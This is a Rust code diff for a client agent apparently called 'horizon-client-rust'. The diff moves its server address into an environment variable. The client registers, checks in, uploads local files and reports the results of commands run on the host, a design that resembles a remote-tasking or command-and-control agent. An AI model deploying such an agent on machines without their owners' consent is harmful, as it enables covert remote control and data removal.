@@ -8,7 +8,11 @@ use std::env;
 use bson::{DateTime, oid::ObjectId};
 use dotenv::dotenv;
 
-const SERVER_URL: &str = "http://127.0.0.1:5487";
+fn get_server_url() -> Result<String, Box<dyn Error>> {
+    dotenv().ok();
+    env::var("SERVER_URL").map_err(|e| format!("SERVER_URL environment variable not set: {}", e).into())
+}
+
 const TOKEN_FILE: &str = "token.jwt";
 
 #[derive(Deserialize, Debug)]
@@ -86,13 +90,14 @@ async fn get_token() -> Result<String, Box<dyn Error>> {
 
 pub async fn register() -> Result<(), Box<dyn Error>> {
     let server_key = get_server_key()?;
+    let server_url = get_server_url()?;
     let client = reqwest::Client::new();
     let mut data = HashMap::new();
     data.insert("guid", "some-unique-guid");
     data.insert("agent", "horizon-client-rust");
 
     let res = client
-        .post(format!("{}/client/register", SERVER_URL))
+        .post(format!("{}/client/register", server_url))
         .header("X-Server-Key", server_key)
         .json(&data)
         .send()
@@ -113,10 +118,11 @@ pub async fn register() -> Result<(), Box<dyn Error>> {
 pub async fn ping() -> Result<(), Box<dyn Error>> {
     let token = get_token().await?;
     let server_key = get_server_key()?;
+    let server_url = get_server_url()?;
     let client = reqwest::Client::new();
 
     let res = client
-        .get(format!("{}/client/ping", SERVER_URL))
+        .get(format!("{}/client/ping", server_url))
         .header("X-Server-Key", server_key)
         .bearer_auth(token)
         .send()
@@ -158,6 +164,7 @@ pub async fn ping() -> Result<(), Box<dyn Error>> {
 pub async fn upload_file(upload_id: ObjectId, path: &str) -> Result<(), Box<dyn Error>> {
     let token = get_token().await?;
     let server_key = get_server_key()?;
+    let server_url = get_server_url()?;
     let file = fs::read(path)?;
     let client = reqwest::Client::new();
 
@@ -165,7 +172,7 @@ pub async fn upload_file(upload_id: ObjectId, path: &str) -> Result<(), Box<dyn 
         .part("file", multipart::Part::bytes(file).file_name(path.to_string()));
 
     let res = client
-        .post(format!("{}/client/upload/result/{}", SERVER_URL, upload_id))
+        .post(format!("{}/client/upload/result/{}", server_url, upload_id))
         .header("X-Server-Key", server_key)
         .bearer_auth(token)
         .multipart(form)
@@ -185,6 +192,7 @@ pub async fn upload_file(upload_id: ObjectId, path: &str) -> Result<(), Box<dyn 
 pub async fn execute_command(command_id: ObjectId, result: &str) -> Result<(), Box<dyn Error>> {
     let token = get_token().await?;
     let server_key = get_server_key()?;
+    let server_url = get_server_url()?;
     let client = reqwest::Client::new();
 
     let data = ExecuteRequest {
@@ -192,7 +200,7 @@ pub async fn execute_command(command_id: ObjectId, result: &str) -> Result<(), B
     };
 
     let res = client
-        .post(format!("{}/client/commands/result/{}", SERVER_URL, command_id))
+        .post(format!("{}/client/commands/result/{}", server_url, command_id))
         .header("X-Server-Key", server_key)
         .bearer_auth(token)
         .json(&data)
